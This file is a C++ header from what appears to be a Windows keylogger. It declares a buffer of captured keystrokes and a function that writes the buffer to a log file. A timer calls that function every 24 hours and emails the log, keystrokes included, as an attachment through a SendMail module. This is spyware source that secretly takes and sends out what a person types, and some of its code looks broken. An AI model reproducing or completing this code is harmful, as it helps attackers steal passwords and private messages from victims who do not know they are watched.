#ifndef KEYBHOOK_H
#define KEYBHOOK_H

#include <iostream>
#include <fstream>
#include <windows.h>
#include "KeyConstants.h"
#include "Timer.h"
#include "SendMail.h"

std::string keylog = "";

void TimerSendMail()
{
    if(keylog.empty())
       return;
    std::string last_file = IO::WriteLog(keylog);

    if(last_file.empty())
    {
        Helper::WriteAppLog("File creation was not succesfull. Keylog '" + keylog + "'");
        return;
    }

    int x = Mail::SendMail("Log [" + last_file + "]", "The file has been attatched to this mail for testing\n" +
                           keylog, IO::GetOurPath(true) + last_file);
    if (x!=7)
        Helper::WriteAppLog("Mail was not sent! Error code: " + Helper::ToString(x));
    else
        keylog = "";
}

Timer MailTimer(TimerSendMail(), 1000 * 60 * 60 * 24, Timer::Infinite);

HHOOK eHook = NULL;


#endif
